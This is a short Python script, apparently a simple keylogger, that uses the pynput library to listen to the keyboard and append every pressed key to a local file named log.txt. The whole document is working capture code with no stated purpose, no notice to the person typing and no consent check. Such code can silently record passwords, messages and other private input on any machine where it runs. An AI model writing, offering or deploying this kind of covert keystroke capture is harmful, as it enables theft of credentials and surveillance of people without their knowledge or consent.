from pynput import keyboard

# this will store the pressed keys
keys = []

# when a key is pressed
def on_press(key):
    try:
        keys.append(str(key.char))
    except AttributeError:
        keys.append(str(key))

    # write to file
    with open("log.txt", "a") as f:
        f.write("".join(keys))
        keys.clear()

# listen to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
